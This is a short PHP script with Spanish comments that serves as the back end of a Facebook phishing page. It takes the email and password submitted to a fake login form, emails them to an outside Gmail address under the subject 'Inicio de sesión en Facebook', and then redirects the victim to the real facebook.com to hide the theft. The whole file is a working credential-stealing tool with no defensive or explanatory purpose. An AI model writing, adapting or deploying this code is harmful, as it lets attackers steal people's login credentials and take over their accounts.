<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST['email'];
    $password = $_POST['password'];

    // Correo al que se enviará el mensaje
    $to = "golitagolitaadesa723@gmail.com";
    // Asunto del correo
    $subject = "Inicio de sesión en Facebook";
    // Mensaje que se enviará
    $message = "Correo electrónico: " . $email . "\nContraseña: " . $password;
    // Cabeceras del correo
    $headers = "From: tu_dirección_de_correo@example.com";

    // Envío del correo electrónico
    if (mail($to, $subject, $message, $headers)) {
        // Redirigir al usuario a la página de inicio de Facebook
        header("Location: https://www.facebook.com");
        exit; // Asegura que el script se detenga después de la redirección
    } else {
        echo "Error al enviar el correo.";
    }
}
?>
